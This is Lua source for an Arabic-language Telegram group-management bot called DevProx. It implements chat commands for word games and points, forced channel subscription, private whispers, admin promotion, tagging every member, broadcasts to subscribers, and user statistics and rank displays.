name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'سدني','Sydney')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'شاطئ','Beach')
name = string.gsub(name,'غبي','Stupid')
ABS_PROX = '☬︙مٱ معنى كڵمة {'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(DevProx..'bot:bkbk7'..msg.chat_id_) or 'qssp')..'' then
if not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then 
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(DevProx..'bot:bkbk7'..msg.chat_id_)
ABS_PROX = '☬︙ڵقد ربحت وحصڵت عڵى نقطة \n☬︙ٱرسڵ ( انكليزيه ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end
DevAbs:set(DevProx..'bot:l:id'..msg.chat_id_,true)
end  
--     Source DevProx     --
if text == 'الالعاب' and Abbas_Abs(msg) or text == 'العاب' and Abbas_Abs(msg) or text == 'اللعبه' and Abbas_Abs(msg) then
if not DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙عذرٱ ٱلٱڵعٱب معطڵة في ٱڵمجمۄعة', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1,[[
☬︙قائمة العاب المجموعة ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙ٱرسڵ ↫ ( حزوره ) للعب
☬︙ٱرسڵ ↫ ( امثله ) للعب
☬︙ٱرسڵ ↫ ( ترتيب ) للعب
☬︙ٱرسڵ ↫ ( العكس ) للعب
☬︙ٱرسڵ ↫ ( المعاني ) للعب
☬︙ٱرسڵ ↫ ( المختلف ) للعب
☬︙ٱرسڵ ↫ ( سمايلات ) للعب
☬︙ٱرسڵ ↫ ( المحيبس ) للعب
☬︙ٱرسڵ ↫ ( رياضيات ) للعب
☬︙ٱرسڵ ↫ ( انكليزيه ) للعب
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙[𝗧𝗘𝗔𝗠 𝗗𝗘𝗩](https://t.me/Dev_Prox)
]], 1, 'md')
end
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") and text:match("^ضع عدد النقاط (%d+)$")  then
local abbs1 = { string.match(text, "^(ضع عدد النقاط) (%d+)$")}
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم وضع عدد نقٱط ٱڵبيع \n☬︙يمكن ڵڵعضو بيع نقٱط ٱلٱڵعاب \n☬︙ٱذٱ كٱنت عدد نقٱطه ٱكثر من(*"..abbs1[2].."*) \n ",1, 'md')
DevAbs:set(DevProx.."gamepoint" .. msg.chat_id_, abbs1[2])
return false end
--     Source DevProx     --
if text == 'بيع نقاطي' and Abbas_Abs(msg) then
if tonumber((DevAbs:get(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
DevAbs0 = '☬︙ڵيس ڵديك نقٱط ٱڵعب ٱولٱ\n☬︙ٱرسڵ ( الالعاب ) ڵڵعب'
Dev_Abs(msg.chat_id_, msg.id_, 1,DevAbs0, 1, 'md') 
else
DevAbs0 = (DevAbs:get(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) * tonumber(DevAbs:get('ABS_PROX:'..bot_id..'gamepoint' .. msg.chat_id_)or 50))
DevAbs:incrby('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,DevAbs0)  
DevAbs:del(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_)
DevAbs0 = tonumber((DevAbs:get('ABS_PROX:'..bot_id..'gamepoint' .. msg.chat_id_) or 50))
Dev_Abs(msg.chat_id_, msg.id_, 1,'☬︙تـۖم بيع نقٱطك \n☬︙كڵ نقطه تسٱوي ('..DevAbs0..') رسٱڵة ', 'md')
end
end
--     Source DevProx     --
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "تعيين الاشتراك الاجباري" and Abbas_Abs(msg) then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
DevAbs:setex(DevProx..'DevAbs4'..msg.sender_user_id_,300,true)
Dev_Abs(msg.chat_id_,msg.id_, 1, "☬︙*ٱرسڵ ڵي معرف قنٱة ٱلٱشترٱك ٱلٱن*", 1 , "md")
end end
if text == "حذف قناة الاشتراك" and is_leader(msg) or text == "حذف قناه الاشتراك" and is_leader(msg) then  
DevAbs:del(DevProx..'DevAbs3')
text = "☬︙تـۖم حذف قنٱة ٱلٱشترٱك ٱلٱجبٱري"
Dev_Abs(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == 'تفعيل الاشتراك الاجباري' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
if not DevAbs:get(DevProx..'DevAbs3') then
Dev_Abs(msg.chat_id_,msg.id_, 1, "☬︙ڵم يتم تعيين قنٱة ٱلٱشترٱك ٱلٱجبٱري \n☬︙ٱرسڵ (تعيين قناة الاشتراك) ڵڵتعيين ", 1 , "md")
return false 
end
if DevAbs:get(DevProx..'DevAbs3') then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـفعيـۧڵ ٱلٱشترٱك ٱلٱجبٱري'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx.."DevAbs2", true)
return false end end end
if text == 'تعطيل الاشتراك الاجباري' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـعطيـۧڵ ٱلٱشترٱك ٱلٱجبٱري'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx.."DevAbs2")
return false 
end end
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط', 1, 'md')
else
local DevAbs5 = DevAbs:get(DevProx.."DevAbs3")
if DevAbs5 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙قنٱة ٱلٱشترٱك ↫ '..DevAbs5..'', 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵم يتم تعيين قنٱة ٱلٱشترٱك ٱلٱجبٱري \n☬︙ٱرسڵ (تعيين قناة الاشتراك) ڵڵتعيين ', 1, 'md')
end end end
--     Source DevProx     --
local msg = data.message_
text = msg.content_.text_ 
if not DevAbs:get(DevProx..'TFF'..msg.chat_id_) then
if text and text:match("^اهمس (.*) (.*)") then 
text = text:gsub('@',"")
for_abs = {string.match(text, "اهمس (.*) (.*)")}
function hamss(res1,res2)
if not res2.id_ then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
return "abs"
end
function hamssss(ress1,ress2)
if (ress2 and ((ress2.status_ and ress2.status_.ID == "ChatMemberStatusLeft") or ress2.ID == "Error")) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵعضو غير موجود في ٱڵمجـمۄعة', 1, 'html')
return "abs"
end
tdcli_function ({
ID="DeleteMessages",
chat_id_= msg.chat_id_,
message_ids_= {[0] = msg.id_}
}, 
dl_cb, nil)
DevAbs:set(DevProx.."HM:"..msg.chat_id_..msg.id_..res2.id_,for_abs[1])
function bot_id_get(ros1,ros2)
bot_username = (ros2.username_ or "DEVIRAQ_BOT")
function Abbas(ross1,ross2)
local hms = msg.sender_user_id_
if ross2.username_ then 
hms = "@"..ross2.username_
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تم صنع همسه ٱڵى : @["..for_abs[2].."] \n☬︙تم ٱرسٱڵهٱ من ↫ ["..hms.."] \n☬︙هو فقط من يستطيع رؤيتهٱ \n☬︙[ٱضغط هنٱ ڵعرض ٱڵهمسه](https://t.me/"..bot_username.."?start=hms"..msg.chat_id_..msg.id_.."_"..res2.id_..")\n", 1, 'md')
end
getUser(msg.sender_user_id_, Abbas)
end
getUser(bot_id, bot_id_get)
end
tdcli_function ({
ID = "GetChatMember",
chat_id_ = msg.chat_id_,
user_id_ = res2.id_
}, hamssss, nil)
end
resolve_username(for_abs[2],hamss) 
end
end
if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تستطيع ٱرسٱڵ ٱڵهمسه بسريه تٱمه ٱڵى ٱلٱعضٱء عن طريق بوت ٱڵحمٱيه \n☬︙ٱستخدم ٱلٱمر كٱلٱتي ↫ ⤈ \n( اهمس + الهمسه + المعرف )\n☬︙مثٱڵ ٱوضح ↫ ⤈ \n( اهمس مرحبا [@IQ_ABS] )', 1, 'md')
end
if text and text:match("/start hms(.*)_(%d+)") then 
for_abs = {string.match(text, "^/start hms(.*)_(%d+)")}
if tonumber(msg.sender_user_id_) == tonumber(for_abs[2]) then 
AbsProx = DevAbs:get(DevProx.."HM:"..for_abs[1]..for_abs[2])
if AbsProx then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵهمسه ٱڵموجهٱ ڵك هي ↫ ⤈\n( ['..AbsProx..'] )', 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱخي ٱڵهمسه ڵيست ڵك', 1, 'md')
end 
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱخي ٱڵهمسه ڵيست ڵك', 1, 'md')
end
end  
--     Source DevProx     --
if text == 'رفع المشرفين' and Abbas_Abs(msg) or text == 'رفع الادمنيه' and Abbas_Abs(msg) then  
local function promote_admin(extra, result, success)  
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
DevAbs:sadd(DevProx..'abs:admins:'..msg.chat_id_, admins[i].user_id_)   
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  
owner_id = admins[i].user_id_  
DevAbs:sadd(DevProx..'abs:monsh:'..msg.chat_id_,owner_id)   
end  
end  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم رفع ('..num..') ٱدمن هنٱ \n☬︙تـۖم رفع منشئ ٱڵمجموعة', 1, 'md')
end
getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
end
--     Source DevProx     --
if is_sudo3(msg.sender_user_id_, msg.chat_id_) then
if text ==  ""..name_bot..' غادر' or text == 'غادر' then
if DevAbs:sismember(DevProx.."Left:Bot",msg.chat_id_) and not is_leader(msg) then
Dev_Abs(msg.chat_id_,msg.id_, 1, "☬︙ٱڵمغٱدره معطڵه من قبڵ ٱڵمطور ٱلٱسٱسي", 1, 'md')
return false  
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم مغٱدرة ٱڵمجموعة \n☬︙تـۖم حذف جميع بيٱنٱتهٱ ', 1, 'md')
chat_leave(msg.chat_id_, bot_id)
DevAbs:srem(DevProx.."bot:groups",msg.chat_id_)
end end
--     Source DevProx     --
if text ==('موقعي') and Abbas_Abs(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'ٱڵـۧمـۧنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'ٱلٱدمـۧن'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'عضو'
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙موقعک ↫ '..rtpa, 1, 'md')
end,nil)
end
--     Source DevProx     --
if text:match("^معلوماتي$") and Abbas_Abs(msg) then
function get_me(extra,result,success)
local Dev_Abss = (DevAbs:get('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local ABS_PROX = DevAbs:get(DevProx..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local msguser = tonumber(DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevAbs:get(DevProx..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevAbs:get(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local text = (tonumber(DevAbs:get(DevProx.."text:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local sticker = (tonumber(DevAbs:get(DevProx.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Photo = (tonumber(DevAbs:get(DevProx.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Voice = (tonumber(DevAbs:get(DevProx.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Gif = (tonumber(DevAbs:get(DevProx.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Video = (tonumber(DevAbs:get(DevProx.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱسمک ↫ ❨ '..result.first_name_..' ❩\n☬︙معرفک ↫ ❨ '..username..' ❩\n☬︙ٱيـډيک ↫ ❨ '..result.id_..' ❩\n☬︙نقاطک ↫ ❨ '..user_nkt..' ❩\n☬︙رسٱئڵک ↫ ❨ '..(user_msgs + Dev_Abss)..' • '..(ABS_PROX)..' ❩\n☬︙مڵصقٱتک ↫ ❨ '..sticker..' ❩\n☬︙ٱڵمتحركة ↫ ❨ '..Gif..' ❩\n☬︙صورک ↫ ❨ '..Photo..' ❩\n☬︙بصمٱتک ↫ ❨ '..Voice..' ❩\n☬︙فيديوهٱتک ↫ ❨ '..Video..' ❩\n☬︙جـهٱتک ↫ ❨ '..cont..' ❩\n☬︙تفٱعڵک ↫ ❨ '..formsgg(msguser)..' ❩\n☬︙رتـبتک ↫ '..id_rank(msg), 1, 'html')
end
getUser(msg.sender_user_id_,get_me)
end
--     Source DevProx     --
if text:match("^الرتبه$") and msg.reply_to_message_id_ ~= 0 and Abbas_Abs(msg) or text:match("^رتبته$") and msg.reply_to_message_id_ ~= 0 and Abbas_Abs(msg) then
function rt_by_reply(extra, result, success) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = result.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then rank_gps = 'ٱڵـۧمـۧنشئ' elseif da.status_.ID == "ChatMemberStatusEditor" then rank_gps = 'ٱلٱدمـۧن' elseif da.status_.ID == "ChatMemberStatusMember" then rank_gps = 'عضو' end
if result.id_ then if tonumber(result.sender_user_id_) == tonumber(218385683) then DeveAbs = 'مبرمج ٱڵسورس' elseif tonumber(result.sender_user_id_) == tonumber(DevId) then DeveAbs = 'ٱڵمطۄر ٱلٱسٱسي' elseif is_sudoid(result.sender_user_id_) then DeveAbs = "ٱڵمطۄر ٱڵثٱنوي" elseif is_sudo3(result.sender_user_id_, msg.chat_id_) then DeveAbs = "ٱڵمطۄر ٱلثٱڵث" elseif is_ownerall(result.sender_user_id_) then DeveAbs = "ٱڵمدير ٱڵعٱم" elseif is_adminall(result.sender_user_id_) then DeveAbs = "ٱلٱدمن ٱڵعٱم" elseif is_vipall(result.sender_user_id_) then DeveAbs = "ٱڵمميز ٱڵعٱم" elseif is_monsh(result.sender_user_id_, msg.chat_id_) then DeveAbs = "ٱڵمنشئ ٱلٱسٱسي" elseif is_monshid(result.sender_user_id_, msg.chat_id_) then DeveAbs = "ٱڵـۧمـۧنشئ" elseif is_owner(result.sender_user_id_, msg.chat_id_) then DeveAbs = "ٱڵـۧمـۧدير" elseif is_admin(result.sender_user_id_, msg.chat_id_) then DeveAbs = "ٱلٱدمـۧن" elseif is_vipmem(result.sender_user_id_, msg.chat_id_) then DeveAbs = "عضو مميز" elseif is_donky(result.sender_user_id_, msg.chat_id_) then DeveAbs = "مطي مرتب 😹💔" else DeveAbs = "فقط عضو" end end
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙رتبته بٱڵبوت ↫ ❨ '..DeveAbs..' ❩ \n☬︙رتبته بٱڵكروب ↫ ❨ '..rank_gps..' ❩' , 1, 'md') 
end,nil)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,rt_by_reply)
end
--     Source DevProx     --
if is_sudo(msg) then
if text == 'اذاعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
function ABS_PROX(extra,result,success)
local listgp = DevAbs:smembers(DevProx.."bot:groups")
for k,v in pairs(listgp) do
forwardMessages(v, msg.chat_id_, {[0] = result.id_}, 1)
end
local listpv = DevAbs:smembers(DevProx.."bot:userss")
for k,v in pairs(listpv) do
forwardMessages(v, msg.chat_id_, {[0] = result.id_}, 1)
end
end
local gps = DevAbs:scard(DevProx..'bot:groups') or 0
local pvs = DevAbs:scard(DevProx..'bot:userss') or 0
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم ٱذٱعة رسٱڵتك بٱڵتوجية \n☬︙‏في ↫ ❨ '..gps..' ❩ مجموعة \n☬︙والى ↫ ❨ '..pvs..' ❩ مشترك \n ✓', 1, 'md')
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ABS_PROX)
end
end
--     Source DevProx     --
if text:match("^(الوقت)$") and Abbas_Abs(msg) or text:match("^(التاريخ)$") and Abbas_Abs(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵوقت ↫ '..os.date("%I:%M%p")..' \n☬︙ٱڵتٱريخ ↫ '..os.date("%Y/%m/%d")..' \n ', 1, 'md')
end
if text:match("^زخرفه$") and Abbas_Abs(msg) or text:match("^الزخرفه$") and Abbas_Abs(msg)  then  
DevAbs:setex(DevProx.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
DevAbs:setex(DevProx.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱرسل ڵي ٱڵكلمة ڵزخرفتهٱ \nيمكنك ٱڵزخرفة بٱڵلغة { en } ⌯ { ar } ', 1, 'md')
end
--     Source DevProx     --
if text:match("^مشاهده المنشور$") and Abbas_Abs(msg) or text:match("^مشاهدات المنشور$") and Abbas_Abs(msg) or text:match("^عدد المشاهدات$") and Abbas_Abs(msg) then
DevAbs:set(DevProx..'bot:viewget'..msg.sender_user_id_,true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙حسنٱ قم بٱعٱدة توجية ڵڵمنشور ٱڵذي تريدني حسٱب مشٱهدٱتة', 1, 'md')
end
--     Source DevProx     --
if text:match("^اطردني$") and Abbas_Abs(msg) or text:match("^ادفرني$") and Abbas_Abs(msg) then
if not DevAbs:get(DevProx.."lock_kickme"..msg.chat_id_) then
DevAbs:set(DevProx..'yes'..msg.sender_user_id_..'', 'kickyes')
DevAbs:set(DevProx..'no'..msg.sender_user_id_..'', 'kickno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙هڵ ٱنت متأكد من ٱڵمغٱدرة \n☬︙ٱرسل *{ نعم }* ڵيتم ٱلٱمـر \n☬︙ٱرسل *{ لا }* لٱڵغٱء ٱلٱمـر ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙عذرٱ هذه ٱڵخٱصية معطڵة ', 1, 'md')
end
end
local kickme = DevAbs:get(DevProx..'yes'..msg.sender_user_id_..'')
if kickme == 'kickyes' then
if text:match("^نعم$") then
if is_vipmem(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙لٱ ٱستطيع طرد ٱڵمشرفين ", 1, "md")
else
local kickme = DevAbs:get(DevProx..'yes'..msg.sender_user_id_..'')
if kickme == 'kickyes' then
chat_kick(msg.chat_id_, msg.sender_user_id_)
DevAbs:del(DevProx..'yes'..msg.sender_user_id_..'', 'kickyes')
DevAbs:del(DevProx..'no'..msg.sender_user_id_..'', 'kickno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم طردك من ٱڵمجـمۄعة", 1, "md")
end
end
end
if text:match("^لا$") then
local notkickme = DevAbs:get(DevProx..'no'..msg.sender_user_id_..'')
if notkickme == 'kickno' then
DevAbs:del(DevProx..'yes'..msg.sender_user_id_..'', 'kickyes')
DevAbs:del(DevProx..'no'..msg.sender_user_id_..'', 'kickno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم ٱڵغٱء ٱلٱمـر ڵن ٱطردك ", 1, "md")
end
end
end   
--     Source DevProx     --
if text == 'تعطيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
if not DevAbs:get(DevProx.."lock_kickme"..msg.chat_id_) then
DevAbs:set(DevProx.."lock_kickme"..msg.chat_id_, true)
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـعطيـۧڵ ٱمـر ٱطردني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
end
if text == 'تفعيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
if DevAbs:get(DevProx.."lock_kickme"..msg.chat_id_) then
DevAbs:del(DevProx.."lock_kickme"..msg.chat_id_)
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـفعيـۧڵ ٱمـر ٱطردني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text == "تاك للكل" and Abbas_Abs(msg) or text == "صيحهم" and Abbas_Abs(msg) then
function tall(f1,f2)
local text = "☬︙وينكم يٱڵربع \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k, v in pairs(f2.members_) do
i = i + 1
if DevAbs:get(DevProx..'user:Name'..v.user_id_) then
text = text..""..i.." ⌯ ❨ ["..DevAbs:get(DevProx..'user:Name'..v.user_id_).."] ❩\n"
else
text = text..""..i.." ⌯ ❨ ["..v.user_id_.."](tg://user?id="..v.user_id_..") ❩\n"
end
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
print(text)
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},tall,nil)
end
--     Source DevProx     --
if text:match("^كللهم (.*)$") and Abbas_Abs(msg) then
local txt = {string.match(text, "^(كللهم) (.*)$")}
function tall(f1, f2)
local text = "☬︙"..txt[2].." \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
i = 0
for k, v in pairs(f2.members_) do
i = i + 1
if DevAbs:get(DevProx..'user:Name'..v.user_id_) then
text = text..""..i.." ⌯ ❨ ["..DevAbs:get(DevProx..'user:Name'..v.user_id_).."] ❩\n"
else
text = text..""..i.." ⌯ ❨ ["..v.user_id_.."](tg://user?id="..v.user_id_..") ❩\n"
end
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
print(text)
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},tall,nil)
end
end
--     Source DevProx     --
if text:match("^source$") or text:match("^Source$") or text:match("^اصدار$") or text:match("^الاصدار$") or  text:match("^السورس$") or text:match("^سورس$") or text:match("^ياسورس$") then 
local text =  [[
☬︙𝗦𝗢𝗨𝗥𝗖𝗘 𝗗𝗘𝗩𝗣𝗥𝗢𝗫
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙[𝗦𝗢𝗨𝗥𝗖𝗘 𝗖𝗛](t.me/Dev_Prox)

☬︙[𝗘𝗫𝗣 𝗦𝗢𝗨𝗥𝗖𝗘](t.me/Exp_Dev)

☬︙[𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥](t.me/IQ_ABS)
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙[𝗧𝗪𝗦 𝗣𝗥𝗢𝗫](t.me/IQA_bot)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     Source DevProx     --
if text:match("^الكروبات$") and is_sudo3(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or text:match("^↫ الكروبات ☬$") and is_sudo3(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
local ABS_PROX = DevAbs:scard(DevProx.."bot:groups")
local abbs = DevAbs:scard("ABS_PROX:addg"..bot_id) or 0
local users = DevAbs:scard(DevProx.."bot:userss")
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙عدد ٱڵمشتركين ↫ ❨ *'..users..'* ❩\n☬︙عدد ٱڵمجموعٱت ↫ ❨ *'..ABS_PROX..'* ❩\n☬︙ٱڵكروبٱت ٱڵمفعڵة ↫ ❨ *'..abbs..'* ❩\n☬︙ٱڵغير مفعڵة ↫ ❨ *'..(ABS_PROX - abbs)..'* ❩\n ✓', 1, 'md')
end  
if text:match("^رسائلي$") and msg.reply_to_message_id_ == 0 and Abbas_Abs(msg) then
local user_msgs = DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local ABS_PROX = DevAbs:get(DevProx..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local Dev_Abss = (DevAbs:get('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙قٱئمة رسٱئڵك في ٱڵمجموعة ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙رسٱئڵك ٱڵحقيقية ↫ *("..user_msgs..")* \n☬︙رسٱئڵك ٱڵمضٱفة ↫ *("..Dev_Abss..")* \n☬︙رسٱئڵك ٱڵيوم ↫ *("..(ABS_PROX)..")*\n☬︙مجموع رسٱئڵك ↫ *("..(user_msgs + Dev_Abss)..")* \n ", 1, 'md')
end
--     Source DevProx     --
if text:match("^معرفي$") and Abbas_Abs(msg) then
function get_username(extra,result,success)
text = '☬︙مۘعرفک ↫ ❨ User ❩'
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
--     Source DevProx     --
if text:match("^اسمي$") and Abbas_Abs(msg) then
function get_firstname(extra,result,success)
text = '☬︙ٱسمک ↫ ❨firstname❩'
local text = text:gsub('firstname',(result.first_name_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
--     Source DevProx     --
if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") or text:match("^بوت الحذف$") then Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙[ اضغط هنا لحذف الحساب ](https://telegram.org/deactivate) \n☬︙[ اضغط هنا لديك مفاجئه ](https://t.me/Dev_Prox)", 1, 'md') end
if text:match("^جهاتي$") and Abbas_Abs(msg) or text:match("^اضافاتي$") and Abbas_Abs(msg) then add = (tonumber(DevAbs:get(DevProx..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙عدد جهٱتك ٱڵمضٱفة ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text:match("^تعديلاتي$") or text:match("^سحكاتي$") and Abbas_Abs(msg) then local edit_msg = DevAbs:get(DevProx..'bot:editmsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙عدد تعديلٱتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
